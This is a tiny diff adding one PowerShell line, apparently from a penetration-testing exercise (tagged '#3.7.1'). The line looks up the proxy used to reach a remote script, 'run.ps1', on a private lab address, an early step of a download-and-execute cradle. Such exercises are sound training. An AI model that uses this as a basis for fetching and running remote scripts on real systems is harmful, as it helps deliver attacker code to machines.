@@ -1,0 +1,2 @@
+[System.Net.WebRequest]::DefaultWebProxy.GetProxy("http://192.168.119.120/run.ps1")
+#3.7.1
